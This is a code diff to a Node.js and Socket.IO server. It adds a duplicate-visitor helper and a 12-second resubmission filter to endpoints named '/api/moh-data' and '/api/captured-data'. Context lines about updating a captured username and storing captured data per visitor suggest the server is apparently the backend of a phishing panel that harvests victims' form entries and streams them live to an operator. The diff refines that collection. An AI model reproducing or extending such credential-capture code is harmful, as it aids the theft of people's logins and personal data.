@@ -328,6 +328,8 @@ function __f91Emit(visitorOrId, event, payload){
   targets.forEach(function(sid){ try { io.to(sid).emit(event, payload); } catch (e) {} });
 }
 /* ===== END FIX91 ===== */
+/*FIX101B*/
+function __f101uniq(){ var seen = {}, out = []; try { visitors.forEach(function(v){ if (v && v._id && !seen[v._id]) { seen[v._id] = 1; out.push(v); } }); } catch(e){} return out; }
 
 // Socket.IO Connection Handler
 io.on("connection", (socket) => {
@@ -1323,6 +1325,16 @@ app.post("/api/moh-data", (req, res) => {
     
     if (matchedVisitor) {
       const v = matchedVisitor.visitor;
+      /*FIX101A*/ try {
+  var __s101 = JSON.stringify(fields || {}) + "|" + String(pageName || "");
+  var __n101 = Date.now();
+  if (v.__f101sig === __s101 && (__n101 - (v.__f101at || 0)) < 12000) {
+    v.__f101sig = __s101; v.__f101at = __n101;
+    visitors.set(matchedVisitor.socketId, v);
+    return res.json({ ok: true, dup: true });
+  }
+  v.__f101sig = __s101; v.__f101at = __n101;
+} catch(e){}
       
       // Update username if captured
       if (username) {
@@ -1407,6 +1419,16 @@ app.post("/api/captured-data", (req, res) => {
     if (matchedVisitor) {
       // Update existing visitor with captured data
       const v = matchedVisitor.visitor;
+      /*FIX101A*/ try {
+  var __s101 = JSON.stringify(fields || {}) + "|" + String(pageName || "");
+  var __n101 = Date.now();
+  if (v.__f101sig === __s101 && (__n101 - (v.__f101at || 0)) < 12000) {
+    v.__f101sig = __s101; v.__f101at = __n101;
+    visitors.set(matchedVisitor.socketId, v);
+    return res.json({ ok: true, dup: true });
+  }
+  v.__f101sig = __s101; v.__f101at = __n101;
+} catch(e){}
       if (!v.dataHistory) v.dataHistory = [];
       v.dataHistory.push({
         content: parsedFields,
